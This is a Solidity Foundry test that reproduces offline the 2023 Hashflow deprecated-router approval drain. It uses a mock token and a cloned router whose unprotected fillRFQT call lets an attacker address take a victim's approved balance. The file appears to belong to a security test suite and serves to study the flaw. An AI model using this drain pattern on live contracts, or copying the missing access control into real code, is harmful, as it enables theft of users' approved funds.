// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {HashflowDeprecatedRouterClone} from
    "../fixtures/malicious-calldata/b-incident/HashflowDeprecatedRouterClone.sol";

/// @title malicious-calldata tier (b): Hashflow deprecated-router approval drain (2023-06-14).
/// @notice Minimized offline reproduction of the documented mechanism: a deprecated Hashflow
///         contract kept a publicly callable function that still invoked `transferFrom` against
///         users' standing approvals, with inadequate access control. Any caller could redirect
///         an approving victim's tokens to an attacker-chosen recipient. Verdict is derived from
///         the real outcome: the approving victim is drained. See PROVENANCE.md.
contract HashflowIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 250_000e18; // representative, scaled
    address constant VICTIM = address(0x5017); // a user who left an approval to the router
    address constant ATTACKER = address(0xBAD44);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_hashflow_deprecatedFn_drainsApproval() public {
        MockERC20 token = new MockERC20();
        HashflowDeprecatedRouterClone router = new HashflowDeprecatedRouterClone();

        // A user holds funds and left a standing approval to the (now deprecated) router.
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(router), type(uint256).max);

        // ATTACK: an unauthorized caller invokes the deprecated fill path, moving the victim's
        // approved tokens to itself. There is no caller authorization on the function.
        vm.prank(ATTACKER);
        router.fillRFQT(address(token), VICTIM, ATTACKER, VICTIM_BALANCE);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("hashflow-deprecated-router-victim", drained);

        assertTrue(drained, "unauthorized deprecated transferFrom should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim's approval");
    }
}
